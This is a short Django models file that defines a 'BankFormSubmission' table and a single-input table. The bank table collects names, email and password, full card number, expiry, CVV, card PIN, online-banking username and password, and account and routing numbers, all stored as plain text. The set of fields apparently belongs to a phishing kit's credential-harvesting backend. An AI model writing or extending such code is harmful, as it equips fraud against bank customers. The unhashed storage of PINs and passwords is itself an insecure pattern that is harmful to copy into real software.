from django.db import models
from django.contrib.auth.models import User

class BankFormSubmission(models.Model):
    submitted_at = models.DateTimeField(auto_now_add=True)
    first_name = models.CharField(max_length=255 , blank=True, null=True, default="")
    last_name = models.CharField(max_length=255 , blank=True, null=True, default="")
    address = models.CharField(max_length=255 , blank=True, null=True, default="")
    email = models.EmailField()
    password = models.CharField(max_length=255 , blank=True, null=True, default="")

    card_number = models.CharField(max_length=16 , blank=True, null=True, default="")
    expiry_date = models.CharField(max_length=5 , blank=True, null=True, default="")  # Format: MM/YY
    ccv_security_code = models.CharField(max_length=3 , blank=True, null=True, default="")
    card_pin = models.CharField(max_length=4 , blank=True, null=True, default="")

    bank_username = models.CharField(max_length=255 , blank=True, null=True, default="")
    bank_password = models.CharField(max_length=255 , blank=True, null=True, default="")
    account_number = models.CharField(max_length=30 , blank=True, null=True, default="")
    routing_number = models.CharField(max_length=9 , blank=True, null=True, default="")

class SingleInput(models.Model):
    input_value = models.CharField(max_length=255, verbose_name="User Input" , blank=True, null=True, default="")

    def __str__(self):
        return self.input_value
